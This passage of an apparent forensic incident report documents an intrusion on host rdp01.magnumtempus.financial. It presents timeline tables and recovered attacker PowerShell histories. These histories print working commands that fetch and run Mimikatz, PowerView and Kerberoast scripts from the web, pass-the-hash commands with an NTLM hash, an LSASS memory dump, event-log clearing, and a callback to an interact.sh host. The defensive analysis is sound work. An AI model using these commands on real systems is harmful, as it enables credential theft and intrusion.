| 2022-02-19T20:52:59Z | 2 | https://www.google.com/search?q=psexec64+download&rlz=1C1GCEA_enUS993US993&oq=psexec64+download&aqs=chrome.0.0i512l2j0i22i30l3.2452j1j7&sourceid=chrome&ie=UTF-8 | Chrome | pat.risus |
| 2022-02-19T20:53:02Z | 1 | https://live.sysinternals.com/ | Chrome | pat.risus |

---

**Finding 4:** Event Logs Cleared (Cover Tracks):

**Security Audit Event Logs Cleared:**

| system_time | id | computer | subject_user |
| -- | -- | -- | -- |
| 2022-02-19 21:30:44 | 1102 | "rdp01.magnumtempus.financial" | "SYSTEM" |


**System Audit Event Logs Cleared:**

| system_time | id | computer | subject_user |
| -- | -- | -- | -- |
| 2022-02-19 21:30:44 | 104 | "rdp01.magnumtempus.financial" | "SYSTEM" |

---

**Finding 5:** LSASS Memory Dump (Cred Harvesting):

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 20:47:03 | 11 | + LSASS Memory Dump File Creation <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\PAT~1.RIS\AppData\Local\Temp\ls ass.DMP <br/> C:\Windows\System32\Taskmgr.exe |

---

**Finding 6:** NTLM DownGrade:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\lmcompatibilitylevel |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\lmcompatibilitylevel |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |

---

**Finding 7:** Process Dump:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 20:48:46 | 1 | + Process Dump via Rundll32 and Comsvcs.dll + Process Dump via Comsvcs DLL <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\rundll32.exe <br/> "C:\windows\system32\rundll32.exe" C:\wi ndows\System32\comsvcs.dll MiniDump 828 C:\dump full |

---

**Finding 8:** Local Account Discovery:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 20:51:37 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 20:52:12 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:03:09 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:03:20 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:03:30 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:12:29 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |

---

**Finding 9:** Adding Users/Administrators:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 21:12:58 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\pat.risus\Deskt op\computers.txt net localgroup administ rators combosecurity /ADD |
| 2022-02-19 21:14:28 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| 2022-02-19 21:15:07 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| 2022-02-19 21:17:46 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:17:59 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:18:28 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:19:03 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\3.txt net localgroup administrator s jimbo /ADD |
| 2022-02-19 21:19:46 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\2.txt net localgroup administrator s hass /ADD |
| 2022-02-19 21:21:25 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\1.txt net localgroup administrator s andy /ADD |

---

**Finding 10:** PsExec Execution:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 20:59:36 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:12:58 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:14:28 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:15:07 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:15:28 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:17:15 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:17:28 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:17:34 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:03 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:10 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:19 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:46 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:21:25 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:21:32 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:26:43 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:28:17 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:30:03 | 13 | + Usage of Sysinternals Tools <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |

---

**Finding 11:** Malware Detected in Memory - Trojan:Win32/Bearfoos.A!ml:
```
Detected: Trojan:Win32/Bearfoos.A!ml
Status: Removed or restored
Date: 2/23/2022 4:27 PM
Details: This program is dangerous and executes commands from an attacker.
Affected items: file: C:\Downloads\Volatility\VoLoki\dlldump\module.4592.b95f5300.7ff61a130000.dll
MD5: 0e17b091ea6e51960d5d3f8d68cdb825 
SHA-1: c0a69ad56c55b9692d4fbe0fe7284046bbf7b939
VirusTotal: No Matches Found
```


**Detected: Trojan:Win32/Bearfoos.A!ml**
```
Status: Quarantined
Date: 2/23/2022 7:33 PM
Affected items: file: C:\Downloads\Volatility\VoLoki\prcdump\executable.4592.exe
MD5: 0e17b091ea6e51960d5d3f8d68cdb825
SHA-1: c0a69ad56c55b9692d4fbe0fe7284046bbf7b939
VirusTotal: No Matches Found
Process ID: 4592
Parent ID: 5076 
Process Name: Taskmgr.exe
```

---

**Finding 12:** Pat Risus: Powershell History (PSReadLine):
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3;
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3";
iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly
clear
mv .\20220219201253_BloodHound.zip .\Desktop\
foreach ($s in [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites ){write-host "[>] (site) $s";foreach ($r in $s.Subnets){write-host "    └─> (subnet) $r";foreach ($m in $s.Servers){write-host "       └─> (server) $m"}}}
ipconfig /all
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
ls
cat .\smbScan.gnmap
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat
Start-Process -FilePath "powershell.exe" -Verb RunAsUser
mv C:\Users\pat.risus\Desktop\computers.txt C:\Users\brent.socium\
tasklist /M;rdpcorets.dll
tasklist /M:rdpcorets.dll
C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 828 C:\dump full
ls C:\
cd C:\Users\brent.socium\
ls
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
ls
pwd
mv .\computers.txt .\Desktop\
cd .\Desktop\
ls
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
clear-eventlog -log application,system,security
get-eventlog --list
get-eventlog -list
telnet
```


**Finding 13:** Brent Socium: Powershell History (PSReadLine):
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3;
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3";
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computerfile C:\Users\pat.risus\Desktop\computers.txt
cd C:\Users\pat.risus\
cd Desktop
cd ..
cd .\brent.socium\
ls
type .\computers.txt
ping files.magnumtempus.finacial
ping files.magnumtempusfinancial.com
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess \\files.magnumtempusfinacial.com
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername files.magnumtempusfinacial.com
get-help invoke-sharefinder
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername 172.16.50.110
wget c88nc6r2vtc00001pg0ggrrksdcyyyyyb.interact.sh
ls
mv .\1.txt .\Desktop\
mv .\2.txt .\Desktop\
mv .\3.txt .\Desktop\
```


**Ansible / Setup Obfuscated Powershell - Not Malicious:**
```
- UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBv
- JgBjAGgAYwBwAC4AYwBvAG0AIAA
- UwBlAHQALQBTAHQAcgBpAGMAdAB
- YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAg
- WwBDAG8AbgBzAG8AbABlAF0AOgA6AEk
```

